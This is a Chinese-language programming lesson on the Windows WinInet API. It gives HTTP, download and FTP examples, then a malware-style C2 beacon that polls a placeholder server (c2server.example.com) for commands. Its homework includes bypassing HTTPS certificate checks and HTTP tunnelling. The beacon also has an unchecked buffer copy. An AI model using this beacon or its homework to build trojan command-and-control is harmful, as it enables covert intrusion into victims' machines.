# 课时05：WinInet API基础

## 课程目标

1. 掌握WinInet库的使用
2. 实现HTTP/HTTPS请求
3. 学会FTP客户端编程
4. 理解WinInet在木马通信中的应用

---

## 名词解释

| 术语 | 解释 |
|------|------|
| WinInet | Windows Internet扩展库 |
| HINTERNET | Internet句柄 |
| InternetOpen | 初始化WinInet |
| InternetConnect | 连接服务器 |
| HttpOpenRequest | 创建HTTP请求 |

---

## 代码实现

### 示例1：HTTP GET请求

```c
// WinInetHttp.c - HTTP请求
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

// HTTP GET请求
BOOL HttpGet(const char* url, char** response, DWORD* responseLen) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    BOOL result = FALSE;
    char buffer[4096];
    DWORD bytesRead;
    DWORD totalBytes = 0;
    DWORD capacity = 4096;
    
    *response = (char*)malloc(capacity);
    if (!*response) return FALSE;
    
    // 初始化WinInet
    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) goto cleanup;
    
    // 打开URL
    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, 
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) goto cleanup;
    
    // 读取数据
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        if (totalBytes + bytesRead >= capacity) {
            capacity *= 2;
            char* newBuf = (char*)realloc(*response, capacity);
            if (!newBuf) goto cleanup;
            *response = newBuf;
        }
        memcpy(*response + totalBytes, buffer, bytesRead);
        totalBytes += bytesRead;
    }
    
    (*response)[totalBytes] = '\0';
    *responseLen = totalBytes;
    result = TRUE;
    
cleanup:
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    
    if (!result && *response) {
        free(*response);
        *response = NULL;
    }
    
    return result;
}

// HTTP POST请求
BOOL HttpPost(const char* url, const char* data, char** response, DWORD* responseLen) {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    URL_COMPONENTSA urlComp;
    char hostName[256], urlPath[1024];
    BOOL result = FALSE;
    
    // 解析URL
    memset(&urlComp, 0, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath);
    
    if (!InternetCrackUrlA(url, 0, 0, &urlComp)) return FALSE;
    
    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) goto cleanup;
    
    hConnect = InternetConnectA(hInternet, hostName, urlComp.nPort,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) goto cleanup;
    
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
        flags |= INTERNET_FLAG_SECURE;
    }
    
    hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, flags, 0);
    if (!hRequest) goto cleanup;
    
    // 设置Content-Type
    char headers[] = "Content-Type: application/x-www-form-urlencoded";
    
    if (!HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data, strlen(data))) {
        goto cleanup;
    }
    
    // 读取响应
    char buffer[4096];
    DWORD bytesRead, totalBytes = 0;
    DWORD capacity = 4096;
    *response = (char*)malloc(capacity);
    
    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        if (totalBytes + bytesRead >= capacity) {
            capacity *= 2;
            *response = (char*)realloc(*response, capacity);
        }
        memcpy(*response + totalBytes, buffer, bytesRead);
        totalBytes += bytesRead;
    }
    
    (*response)[totalBytes] = '\0';
    *responseLen = totalBytes;
    result = TRUE;
    
cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return result;
}

int main() {
    char* response;
    DWORD responseLen;
    
    printf("=== WinInet HTTP Demo ===\n\n");
    
    // GET请求
    if (HttpGet("http://httpbin.org/get", &response, &responseLen)) {
        printf("GET Response (%d bytes):\n%s\n", responseLen, response);
        free(response);
    }
    
    // POST请求
    if (HttpPost("http://httpbin.org/post", "key=value&test=123", &response, &responseLen)) {
        printf("\nPOST Response (%d bytes):\n%s\n", responseLen, response);
        free(response);
    }
    
    return 0;
}
```

### 示例2：文件下载

```c
// WinInetDownload.c - 文件下载
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

BOOL DownloadFile(const char* url, const char* savePath) {
    HINTERNET hInternet = NULL, hUrl = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BOOL result = FALSE;
    char buffer[8192];
    DWORD bytesRead, bytesWritten;
    DWORD totalBytes = 0;
    
    hInternet = InternetOpenA("Downloader/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) goto cleanup;
    
    hUrl = InternetOpenUrlA(hInternet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) goto cleanup;
    
    // 获取文件大小
    DWORD fileSize = 0, sizeLen = sizeof(fileSize);
    HttpQueryInfoA(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
                   &fileSize, &sizeLen, NULL);
    
    printf("Downloading: %s\n", url);
    if (fileSize > 0) printf("File size: %d bytes\n", fileSize);
    
    hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) goto cleanup;
    
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
        totalBytes += bytesRead;
        
        if (fileSize > 0) {
            printf("\rProgress: %d%%", (totalBytes * 100) / fileSize);
        }
    }
    
    printf("\nDownloaded %d bytes to %s\n", totalBytes, savePath);
    result = TRUE;
    
cleanup:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hUrl) InternetCloseHandle(hUrl);
    if (hInternet) InternetCloseHandle(hInternet);
    return result;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <url> <save_path>\n", argv[0]);
        return 1;
    }
    
    if (DownloadFile(argv[1], argv[2])) {
        printf("Download successful!\n");
    } else {
        printf("Download failed: %d\n", GetLastError());
    }
    
    return 0;
}
```

### 示例3：FTP操作

```c
// WinInetFtp.c - FTP客户端
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

typedef struct _FTP_SESSION {
    HINTERNET hInternet;
    HINTERNET hFtp;
} FTP_SESSION, *PFTP_SESSION;

BOOL FtpConnect(PFTP_SESSION session, const char* host, const char* user, const char* pass) {
    session->hInternet = InternetOpenA("FTP Client", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!session->hInternet) return FALSE;
    
    session->hFtp = InternetConnectA(session->hInternet, host, INTERNET_DEFAULT_FTP_PORT,
        user, pass, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    
    return session->hFtp != NULL;
}

void FtpDisconnect(PFTP_SESSION session) {
    if (session->hFtp) InternetCloseHandle(session->hFtp);
    if (session->hInternet) InternetCloseHandle(session->hInternet);
}

BOOL FtpUploadFile(PFTP_SESSION session, const char* localPath, const char* remotePath) {
    return FtpPutFileA(session->hFtp, localPath, remotePath, FTP_TRANSFER_TYPE_BINARY, 0);
}

BOOL FtpDownloadFile(PFTP_SESSION session, const char* remotePath, const char* localPath) {
    return FtpGetFileA(session->hFtp, remotePath, localPath, FALSE, 0, FTP_TRANSFER_TYPE_BINARY, 0);
}

void FtpListDirectory(PFTP_SESSION session, const char* path) {
    WIN32_FIND_DATAA findData;
    HINTERNET hFind;
    
    if (path) FtpSetCurrentDirectoryA(session->hFtp, path);
    
    hFind = FtpFindFirstFileA(session->hFtp, "*", &findData, 0, 0);
    if (!hFind) {
        printf("Directory listing failed\n");
        return;
    }
    
    printf("Directory listing:\n");
    do {
        char type = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 'd' : '-';
        printf("%c %10d %s\n", type, findData.nFileSizeLow, findData.cFileName);
    } while (InternetFindNextFileA(hFind, &findData));
    
    InternetCloseHandle(hFind);
}

int main() {
    FTP_SESSION session = {0};
    
    printf("=== FTP Client Demo ===\n\n");
    
    if (FtpConnect(&session, "ftp.example.com", "user", "pass")) {
        printf("Connected to FTP server\n");
        FtpListDirectory(&session, "/");
        FtpDisconnect(&session);
    } else {
        printf("Connection failed: %d\n", GetLastError());
    }
    
    return 0;
}
```

### 示例4：C2 HTTP通信

```c
// C2Http.c - 基于HTTP的C2通信
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

#define C2_URL "http://c2server.example.com/beacon"

// 发送信标
BOOL SendBeacon(const char* data, char** response) {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    BOOL result = FALSE;
    
    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;
    
    URL_COMPONENTSA urlComp = {0};
    char hostName[256], urlPath[1024];
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath);
    InternetCrackUrlA(C2_URL, 0, 0, &urlComp);
    
    hConnect = InternetConnectA(hInternet, hostName, urlComp.nPort,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) goto cleanup;
    
    hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) goto cleanup;
    
    // 自定义头部（可用于识别）
    char headers[512];
    sprintf_s(headers, sizeof(headers),
        "Content-Type: application/octet-stream\r\n"
        "X-Session-ID: %08X", GetTickCount());
    
    if (!HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data, strlen(data))) {
        goto cleanup;
    }
    
    // 读取响应
    char buffer[4096];
    DWORD bytesRead, totalBytes = 0;
    *response = (char*)malloc(4096);
    
    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        memcpy(*response + totalBytes, buffer, bytesRead);
        totalBytes += bytesRead;
    }
    (*response)[totalBytes] = '\0';
    
    result = TRUE;
    
cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return result;
}

// Beacon循环
void BeaconLoop() {
    while (1) {
        char beacon[256];
        sprintf_s(beacon, sizeof(beacon), "BEACON|%d|%d",
                  GetCurrentProcessId(), GetTickCount());
        
        char* response;
        if (SendBeacon(beacon, &response)) {
            // 处理C2命令
            if (strncmp(response, "CMD:", 4) == 0) {
                // 执行命令...
            }
            free(response);
        }
        
        Sleep(60000);  // 1分钟间隔
    }
}
```

---

## 课后作业

1. 实现HTTPS证书验证绕过
2. 添加代理支持
3. 实现断点续传下载
4. 编写HTTP隧道

---

## 扩展阅读

- WinInet API参考
- HTTP协议详解
- 安全通信实现
